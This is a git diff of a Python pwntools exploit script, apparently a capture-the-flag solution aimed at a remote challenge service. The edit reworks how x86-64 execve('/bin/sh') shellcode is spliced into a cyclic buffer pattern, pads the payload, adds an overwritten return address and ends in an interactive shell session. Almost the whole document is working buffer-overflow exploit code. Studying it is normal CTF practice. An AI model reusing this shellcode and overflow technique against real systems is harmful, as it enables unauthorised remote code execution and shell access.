@@ -1,7 +1,7 @@
 from pwn import *
 import struct
 
-print(cyclic(200))
+# print(cyclic(200))
 
 ip = 'ctf.adl.tw'
 port = 11003
@@ -15,8 +15,6 @@ afterr = "aaaabaaacaa     eaaafaaagaa     iaaajaaakaa     maaanaaaoaa     qaaara
 # 23
 shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
 
-print(shellcode)
-
 shellcode_list = list()
 
 for i in shellcode:
@@ -29,16 +27,19 @@ for i in afterr:
         shellcode += 'a'
     else:
         if len(shellcode_list) != 0:            
-            shellcode += shellcode_list[0]
-            shellcode_list.pop(0)
+            shellcode += shellcode_list.pop(0)
         else:
             shellcode += 'a'
-        
-print(shellcode)
-# print(len(shellcode))
 
-# payload = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj"
-# r.sendline(payload)
+while len(shellcode) < len(before):
+    shellcode += 'a'
+
+print(len(shellcode))
+
+shellcode += p64(0x0000000000400783)
+# shellcode += p64(0x00000000004007fc)
+
+print(shellcode)
 
 r.sendline(shellcode)
 r.interactive()
